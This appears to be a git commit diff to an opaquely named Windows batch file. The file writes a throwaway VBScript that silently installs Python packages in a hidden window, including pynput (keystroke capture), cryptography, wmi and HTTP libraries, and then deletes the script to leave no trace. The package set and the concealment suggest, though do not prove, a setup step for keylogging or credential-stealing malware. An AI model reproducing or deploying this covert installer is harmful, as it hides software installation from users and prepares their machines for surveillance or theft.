3c15e8238063dea45027a1d4f4577d512f1724b7
AnkoUguisu <140261867+AnkoUguisu@users.noreply.github.com>
2024-09-01 22:03:15 +0300

    Update 7d36799c42c2___.bat

--- 33837844-3d1a-4710-a7f0-27e6843b7160/7d36799c42c2___.bat
+++ 33837844-3d1a-4710-a7f0-27e6843b7160/7d36799c42c2___.bat
@@ -2,9 +2,8 @@
 @echo off
 
 echo Set objShell = WScript.CreateObject("WScript.Shell") > %TEMP%\hidden.vbs
-echo objShell.Run "cmd /c python -m pip install requests pycryptodome pypiwin32 psutil pywin32 wmi pynput cryptography", 0, True >> %TEMP%\hidden.vbs
+echo objShell.Run "cmd /c python -m pip install requests pycryptodome pypiwin32 psutil pywin32 wmi pynput cryptography aiohttp", 0, True >> %TEMP%\hidden.vbs
 
 cscript //nologo %TEMP%\hidden.vbs
 
-REM Geçici .vbs dosyasını sil
 del %TEMP%\hidden.vbs
